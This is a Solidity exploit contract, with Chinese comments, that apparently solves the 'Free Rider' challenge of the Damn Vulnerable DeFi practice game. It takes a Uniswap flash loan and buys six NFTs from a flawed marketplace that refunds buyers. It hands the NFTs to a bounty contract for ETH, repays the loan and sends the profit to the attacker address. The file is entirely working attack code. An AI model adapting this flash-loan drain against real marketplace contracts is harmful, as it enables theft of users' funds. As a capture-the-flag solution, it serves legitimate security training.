// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
  
  FreeRiderBuyer buyer;
  FreeRiderNFTMarketplace marketplace;

  IUniswapV2Pair pair;
  IWETH weth;
  DamnValuableNFT nft;
  address attacker;

  uint256[] tokenIds = [0, 1, 2, 3, 4, 5];


  constructor(address _buyer, address payable _marketplace, address _pair, address _weth, address _nft) payable {
    buyer = FreeRiderBuyer(_buyer);
    marketplace = FreeRiderNFTMarketplace(_marketplace);

    pair = IUniswapV2Pair(_pair);
    weth = IWETH(_weth);
    nft = DamnValuableNFT(_nft);

    attacker = msg.sender;
  }

  function attack(uint amount) external {
    // 配对合约: WETH-DVT
    // 通过 uniswap 闪电贷借出 amount 数量的 WETH
    pair.swap(amount, 0, address(this), "x");
  }

  // uniswap 闪电贷回调
  function uniswapV2Call(
    address sender,
    uint amount0,
    uint amount1,
    bytes calldata data
  ) external {
    // 将借出的 WETH 转成 ETH
    weth.withdraw(amount0);

    // 将借出的15ETH转给交易合约用于购买tokenId为0~5的NFT
    marketplace.buyMany{value: amount0}(tokenIds);

    // 将购买的NFT转给buyer, 并得到 45 ETH
    for (uint tokenId = 0; tokenId < tokenIds.length; tokenId++) {
      nft.safeTransferFrom(address(this), address(buyer), tokenId);
    }

    // 计算闪电贷要还的费用, 并将要还的部分转成 weth
    uint fee = amount0 * 3 / 997 + 1;
    weth.deposit{value: fee + amount0}();

    // 返还闪电贷
    weth.transfer(address(pair), fee + amount0);

    // 将剩余的 eth 转给 attacker
    payable(address(attacker)).transfer(address(this).balance);
  }

  receive() external payable {}

  function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
      return IERC721Receiver.onERC721Received.selector;
  }
}
